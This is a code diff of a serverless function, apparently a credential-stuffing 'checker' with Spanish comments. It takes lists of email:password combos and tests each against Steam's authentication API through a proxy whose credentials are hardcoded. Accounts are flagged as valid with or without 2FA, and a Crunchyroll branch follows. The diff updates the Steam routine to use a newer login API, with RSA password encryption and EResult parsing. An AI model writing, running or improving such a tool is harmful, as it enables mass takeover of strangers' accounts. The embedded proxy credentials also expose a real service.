@@ -13,9 +13,7 @@ exports.handler = async (event) => {
     if (event.httpMethod === 'OPTIONS') return { statusCode: 200, headers, body: '' };
     if (event.httpMethod !== 'POST') return { statusCode: 405, headers, body: 'Method Not Allowed' };
 
-    const proxies = [
-        'http://poxweudy:pvma7be69xzy@45.38.107.97:6014'
-    ];
+    const proxies = ['http://poxweudy:pvma7be69xzy@45.38.107.97:6014'];
 
     try {
         const { service, combos } = JSON.parse(event.body);
@@ -25,66 +23,68 @@ exports.handler = async (event) => {
             if (!combo.includes(':')) continue;
             const [email, password] = combo.split(':');
 
-            const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
-            const agent = new HttpsProxyAgent(proxyUrl);
-            
+            const agent = new HttpsProxyAgent(proxies[Math.floor(Math.random() * proxies.length)]);
             let isValid = false;
             let reason = 'Credenciales inválidas';
 
             if (service === 'steam') {
                 try {
-                    // 1. AGARRAMOS LA COOKIE DE SESIÓN Y EL RSA
-                    const initRes = await axios.get('https://store.steampowered.com/login/', { httpsAgent: agent, timeout: 10000 });
-                    const cookies = initRes.headers['set-cookie'] ? initRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ') : '';
+                    // 1. Obtener la clave pública RSA desde la API moderna
+                    const rsaRes = await axios.get(`https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name=${encodeURIComponent(email)}`, { httpsAgent: agent, timeout: 10000 });
+                    const rsaData = rsaRes.data.response;
                     
-                    const rsaRes = await axios.get(`https://store.steampowered.com/login/getrsakey/?username=${encodeURIComponent(email)}`, { 
-                        headers: { 'Cookie': cookies },
-                        httpsAgent: agent, 
-                        timeout: 10000 
-                    });
+                    if (!rsaData || !rsaData.publickey_mod) {
+                        reason = 'No se pudo obtener la clave RSA';
+                        results.push({ email, valid: false, reason });
+                        continue;
+                    }
+
+                    // 2. Cifrar la contraseña con PKCS#1 v1.5
+                    const pubKey = forge.pki.rsa.setPublicKey(
+                        new forge.jsbn.BigInteger(rsaData.publickey_mod, 16),
+                        new forge.jsbn.BigInteger(rsaData.publickey_exp, 16)
+                    );
+                    const encryptedPass = forge.util.encode64(pubKey.encrypt(password, 'RSAES-PKCS1-V1_5'));
+
+                    // 3. Iniciar sesión con las credenciales cifradas
+                    const loginRes = await axios.post('https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/', 
+                        new URLSearchParams({
+                            account_name: email,
+                            encrypted_password: encryptedPass,
+                            encryption_timestamp: rsaData.timestamp,
+                            remember_login: 'true',
+                            platform_type: 'web',
+                            persistence: '1',
+                            website_id: 'Store'
+                        }).toString(),
+                        { 
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            httpsAgent: agent, 
+                            timeout: 15000 
+                        }
+                    );
+
+                    const authResponse = loginRes.data.response;
                     
-                    if (rsaRes.data && rsaRes.data.success) {
-                        // 2. ENCRIPTAMOS LA CLAVE
-                        const pubKey = forge.pki.rsa.setPublicKey(
-                            new forge.jsbn.BigInteger(rsaRes.data.publickey_mod, 16),
-                            new forge.jsbn.BigInteger(rsaRes.data.publickey_exp, 16)
-                        );
-                        const encryptedPass = forge.util.encode64(pubKey.encrypt(password));
-
-                        // 3. MANDAMOS EL LOGIN
-                        const loginRes = await axios.post('https://store.steampowered.com/login/dologin/', 
-                            new URLSearchParams({
-                                username: email,
-                                password: encryptedPass,
-                                rsatimestamp: rsaRes.data.timestamp,
-                                remember_login: 'true'
-                            }).toString(),
-                            { 
-                                headers: { 
-                                    'Content-Type': 'application/x-www-form-urlencoded',
-                                    'Cookie': cookies
-                                },
-                                httpsAgent: agent, 
-                                timeout: 15000 
-                            }
-                        );
-
-                        if (loginRes.data.success) {
+                    // EResult 5 (InvalidPassword) o 18 (RateLimitExceeded) = BAD
+                    if (!authResponse || (authResponse.eresult !== 1 && authResponse.eresult !== 63)) {
+                        reason = `Credenciales inválidas (EResult: ${authResponse?.eresult || 'Desconocido'})`;
+                    } else {
+                        // Si el guard_type es 2, 3 o 4, la cuenta es válida pero requiere 2FA
+                        const guardType = authResponse.allowed_confirmations?.[0]?.confirmation_type || 0;
+                        if (guardType === 2 || guardType === 3 || guardType === 4) {
+                            isValid = true;
+                            reason = 'Válida (Requiere 2FA/Steam Guard)';
+                        } else {
                             isValid = true;
                             reason = 'Válida (Sin 2FA)';
-                        } else if (loginRes.data.requires_twofactor) {
-                            isValid = true;
-                            reason = 'Válida (Pide 2FA)';
-                        } else {
-                            // ACÁ TE ESCUPE EL ERROR REAL DE STEAM
-                            reason = 'Error Steam: ' + (loginRes.data.message || JSON.stringify(loginRes.data));
                         }
                     }
                 } catch (e) {
-                    reason = 'Error de proxy/red: ' + e.message;
+                    reason = 'Error de red/proxy: ' + (e.response?.status || e.message);
                 }
             } else {
-                // Lógica de Crunchyroll
+                // Lógica de Crunchyroll (se mantiene igual)
                 const randomDeviceId = crypto.randomBytes(16).toString('hex');
                 const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
                 try {
